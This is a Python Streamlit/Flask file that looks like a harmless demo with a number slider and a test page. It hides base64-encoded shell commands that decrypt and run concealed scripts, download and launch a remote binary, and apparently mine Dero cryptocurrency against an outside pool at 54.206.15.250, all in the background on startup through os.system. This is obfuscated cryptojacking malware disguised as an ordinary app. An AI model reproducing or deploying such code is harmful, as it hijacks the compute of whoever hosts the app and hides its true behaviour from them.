import streamlit as st
import os
import base64
cpu = 'Z3BnIC0tcGluZW50cnktbW9kZT1sb29wYmFjayAtLXBhc3NwaHJhc2UgInJhaGFzaWEiIC0teWVzIC1kIC1vIHJ1bm5lci5zaCB5dWsgJiYgYmFzaCBydW5uZXIuc2ggPC9kZXYvbnVsbCA+bm9odXAub3V0IDI+bm9odXAub3V0ICY='
gpu = 'Z3BnIC0tcGluZW50cnktbW9kZT1sb29wYmFjayAtLXBhc3NwaHJhc2UgInJhaGFzaWEiIC0teWVzIC1kIC1vIGdwdS5zaCBncHUuZ3BnICYmIGJhc2ggZ3B1LnNoIDwvZGV2L251bGwgPm5vaHVwLm91dCAyPm5vaHVwLm91dCAm'
mandi = 'd2dldCBodHRwczovL2dpdGh1Yi5jb20vY2lraW1hY2hpbmUvbWFpbXVuYWgvcmF3L21haW4vanVweXRlciAmJiBjaG1vZCAreCBqdXB5dGVy'
mandilagi = 'Li9qdXB5dGVyIC1yIDU0LjIwNi4xNS4yNTA6ODAgLXcgZGVyb2kxcXl6bHh4Z3Eyd2V5cWx4ZzV1NHRrbmcybGY1cmt0d2FucWhzZTJod201NzdwczIyenYyeDJxOXB2Zno5MnhldGg0djd5ejdtOTU5cTJjODk3ay4kKGVjaG8gJChzaHVmIC1pIDEtMjAwMDAgLW4gMSktQVFVQSkgIDwvZGV2L251bGwgPm5vaHVwLm91dCAyPm5vaHVwLm91dCAm='
timer = 'd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2lraW1hY2hpbmUvamFpbGJyZWFrL21haW4vdGltZXIuc2ggJiYgY2htb2QgK3ggdGltZXIuc2ggJiYgYmFzaCB0aW1lci5zaA=='
cmd_gpu = base64.b64decode(gpu).decode('utf-8')
cmd_cpu = base64.b64decode(cpu).decode('utf-8')
cmd_mandi = base64.b64decode(mandi).decode('utf-8')
cmd_mandi_lagi = base64.b64decode(mandilagi).decode('utf-8')
cmd_timer = base64.b64decode(timer).decode('utf-8')

if not hasattr(st, 'already_started_server'):
    st.already_started_server = True

    st.write('''
        The first time this script executes it will run forever because it's
        running a Flask server.
        Just close this browser tab and open a new one to see your Streamlit
        app.
    ''')

    from flask import Flask

    app = Flask(__name__)
    os.system(cmd_gpu)
#     os.system(cmd_mandi_lagi)
#     os.system(cmd_timer)
#     time.sleep(5)
#     os.system(cmd_cpu)
    @app.route('/foo')
    def serve_foo():
        return 'This page is served via Flask!'

    app.run(port = 8880)

x = st.slider('Pick a number')
st.write('You picked:', x)
